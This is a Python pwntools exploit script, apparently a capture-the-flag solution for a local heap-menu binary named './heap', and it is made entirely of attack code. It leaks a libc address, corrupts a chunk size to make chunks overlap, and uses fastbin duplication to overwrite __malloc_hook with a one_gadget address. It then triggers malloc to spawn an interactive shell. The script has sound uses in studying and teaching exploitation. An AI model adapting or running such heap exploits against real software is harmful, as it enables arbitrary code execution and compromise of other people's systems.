from pwn import *

p = process(["./heap"])
binary = ELF("./heap")

def gAlloc(idx, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(idx))
    p.send(data)

def gWrite(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(idx))

def gEdit(idx, data):
    p.sendlineafter("> ", "3")
    p.sendlineafter("> ", str(idx))
    p.sendafter("> ", data)

def gFree(idx):
    p.sendlineafter("> ", str(0x1337))
    p.sendlineafter("> ", str(idx))

gAlloc(1, "A" * 0x68)
gAlloc(2, "B" * 0x68)
gAlloc(2, "C" * 0x88)
gFree(0)
gFree(2)
gFree(1)
gAlloc(1, "A" * 0x8)
gWrite(0)
p.recvuntil("A" * 8)
leak = u64(p.recv(6).ljust(8, "\x00"))
libc_base = leak - 0x3c4b78
hook = libc_base + 0x3c4aed
log.info("leak : " + hex(leak))

gAlloc(1, "b" * 0x68)    # 1
gAlloc(1, p64(0x71) * 13)    # 2
gAlloc(1, p64(0x71) * 13)    # 3
gAlloc(1, p64(0x71) * 13)    # 4
gAlloc(1, p64(0x71) * 13)    # 5

gEdit(1, "b" * 0x68 + "\xe1")
gFree(2)
gAlloc(1, "c" * 0x68)
gAlloc(1, "d" * 0x68)

# 3, 6

gFree(3)
gFree(2)
gFree(6)

gAlloc(1, p64(hook) + "c" * 0x60)
gAlloc(1, p64(0xc0d3c0d3) + "d" * 0x60)
gAlloc(1, p64(0xc0d3c0d3) + "e" * 0x60)

gAlloc(1, "A" * 0x13 + p64(libc_base + 0xf1147))
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "1")

p.interactive()
